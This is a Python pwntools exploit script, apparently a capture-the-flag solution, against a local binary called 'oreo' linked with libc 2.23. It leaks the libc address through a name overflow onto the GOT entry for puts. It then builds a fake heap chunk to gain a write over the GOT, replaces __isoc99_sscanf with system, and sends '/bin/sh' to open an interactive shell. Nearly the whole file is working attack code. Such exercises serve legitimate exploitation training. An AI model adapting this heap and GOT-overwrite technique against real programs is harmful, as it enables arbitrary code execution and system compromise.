import pwn as p

target = p.process('./oreo', env={'LD_PRELOAD': './libc-2.23.so'})
# p.gdb.attach(target, gdbscript='b *0x080487eb')

libc = p.ELF('./libc-2.23.so')
# libc = p.ELF('./libc-2.31.so')
oreo = p.ELF('./oreo')


def b(s: str) -> bytes:
    return s.encode('utf8')


def s(b: bytes) -> str:
    return b.decode('utf8')


def prints(b: bytes):
    print(s(b))


def add_rifle(name: bytes, description: bytes) -> None:
    target.sendline(b'1')
    target.sendline(name)
    target.sendline(description)


def leak_puts() -> None:
    target.sendline(b'2')
    print(target.recvuntil(b'Description: '))
    print(target.recvuntil(b'Description: '))
    line = target.recvline().strip()
    return p.u32(line[:4])


def order() -> None:
    target.sendline(b'3')


def order_message(msg: bytes) -> None:
    target.sendline(b'4')
    target.sendline(msg)


def show_status() -> None:
    target.sendline(b'5')


def exit() -> None:
    target.sendline(b'6')


add_rifle(b'1'*0x1b+p.p32(oreo.got['puts']), b'b'*0x4)
puts_leak = leak_puts()
libc_base = puts_leak - libc.symbols['puts']
print('libc_base:', hex(libc_base))
system = libc_base + libc.symbols['system']
print('system:', hex(system))

# incrementing rifle counter to have an adequate size for the fake chunk
# also, we have to overwrite the nextRifle pointer, since we have an entry that we can not free
for i in range(0x3f):
    add_rifle(b'1'*0x1b+p.p32(0x0), b'dummy')
    order()

# add a rifle that points to the fake chunk
add_rifle(b'1'*0x1b+p.p32(0x0804a2a8), b'rifle to fake')
order_message(p.p32(0x0)*9 + p.p32(0x81))  # payload of fake chunk + header of next fake chunk

# put our fake chunk in the bin
order()

# allocate fake chunk in order to replace destination of order_message
add_rifle(b'15935728', p.p32(oreo.got['__isoc99_sscanf']))

# now that we point to `__isoc99_sscanf` in got, we will overwrite it with system's address
order_message(p.p32(system))

# now we give an "option" that would be read by scanf, but it is replaced by system
target.sendline(b'/bin/sh')

target.interactive()
